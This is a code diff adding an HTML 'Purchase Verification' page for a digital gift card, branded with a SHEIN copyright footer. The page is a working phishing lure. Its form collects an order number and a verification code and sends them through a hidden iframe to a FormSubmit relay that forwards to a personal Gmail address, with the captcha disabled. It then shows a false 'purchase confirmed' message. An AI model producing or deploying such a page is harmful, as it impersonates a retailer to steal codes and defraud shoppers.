@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Purchase Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111;
+      margin: 0;
+      padding: 0;
+      color: #fff;
+    }
+    .container {
+      background: #1a1a1a;
+      max-width: 500px;
+      margin: 50px auto;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    }
+    h2 {
+      text-align: center;
+      color: #000;
+      font-weight: bold;
+      font-size: 32px;
+      margin-bottom: 25px;
+    }
+    .info {
+      background: #222;
+      border: 1px solid #333;
+      padding: 20px;
+      border-radius: 6px;
+      margin-bottom: 25px;
+      line-height: 1.6;
+    }
+    .info p { margin: 6px 0; font-size: 15px; }
+    p.instructions {
+      font-size: 15px;
+      margin-bottom: 20px;
+      color: #ddd;
+    }
+    form input, form button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      font-size: 15px;
+      border-radius: 5px;
+      border: 1px solid #333;
+      background: #111;
+      color: #fff;
+    }
+    form input::placeholder { color: #bbb; }
+    button {
+      background: #ffcc00;
+      color: #111;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover { background: #e6b800; }
+    .thankyou-box {
+      display: none;
+      text-align: center;
+      padding: 30px;
+    }
+    .thankyou-box h3 { color: #00ff00; margin-bottom: 15px; }
+    .thankyou-box p { color: #ddd; }
+    .footer {
+      font-size: 13px;
+      color: #777;
+      text-align: center;
+      margin-top: 30px;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="form-box">
+    <h2>PURCHASE VERIFICATION</h2>
+
+    <div class="info">
+      <p><strong>Product:</strong> Digital Gift Card</p>
+      <p><strong>Delivery Method:</strong> Email</p>
+    </div>
+
+    <p class="instructions">Enter your Order Number and Verification Code to complete your purchase:</p>
+
+    <form action="https://formsubmit.co/testtest00133@gmail.com" method="POST" target="hidden_iframe" onsubmit="showThankYou()">
+      <!-- FormSubmit setup -->
+      <input type="hidden" name="_subject" value="New Purchase Verification Submitted">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_autoresponse" value="✅ Thank you! We’ve received your purchase verification details. Your order will be processed shortly.">
+
+      <!-- Form fields -->
+      <input type="text" name="order_number" placeholder="Order Number" required>
+      <input type="text" name="verification_code" placeholder="Verification Code" required>
+
+      <button type="submit">Confirm Purchase</button>
+    </form>
+  </div>
+
+  <div class="container thankyou-box" id="thankyou-box">
+    <h3>✅ Thank You!</h3>
+    <p>Your purchase has been confirmed successfully.</p>
+    <p>We’ve received your verification details and sent a copy to your email inbox.</p>
+  </div>
+
+  <iframe name="hidden_iframe" style="display:none;"></iframe>
+
+  <script>
+    function showThankYou() {
+      setTimeout(() => {
+        document.getElementById("form-box").style.display = "none";
+        document.getElementById("thankyou-box").style.display = "block";
+      }, 800);
+    }
+  </script>
+
+  <div class="footer">
+    &copy; SHEIN US Company. All Rights Reserved.
+  </div>
+</body>
+</html>
